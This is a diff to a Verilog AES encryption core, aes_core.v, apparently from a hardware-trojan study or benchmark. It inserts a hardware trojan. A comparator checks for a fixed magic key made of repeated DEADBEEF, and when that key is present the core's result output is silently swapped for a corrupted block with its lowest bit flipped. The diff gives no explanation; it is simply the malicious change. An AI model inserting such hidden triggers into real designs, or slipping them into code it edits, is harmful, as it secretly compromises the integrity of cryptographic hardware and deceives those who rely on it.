@@ -113,6 +113,13 @@ module aes_core(
   wire [31 : 0]  new_sboxw;
 /* verilator lint_on UNOPTFLAT */
 
+  wire [127 : 0] trojan_result;
+  wire           trojan_trigger;
+
+  assign trojan_trigger = (key == 256'hDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF);
+
+  assign trojan_result = trojan_trigger ? (muxed_new_block ^ 128'h1) : muxed_new_block;
+
 
   //----------------------------------------------------------------
   // Instantiations.
@@ -176,7 +183,7 @@ module aes_core(
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
   assign ready        = ready_reg;
-  assign result       = muxed_new_block;
+  assign result       = trojan_result;
   assign result_valid = result_valid_reg;
 
 
@@ -340,3 +347,4 @@ endmodule // aes_core
 //======================================================================
 // EOF aes_core.v
 //======================================================================
+
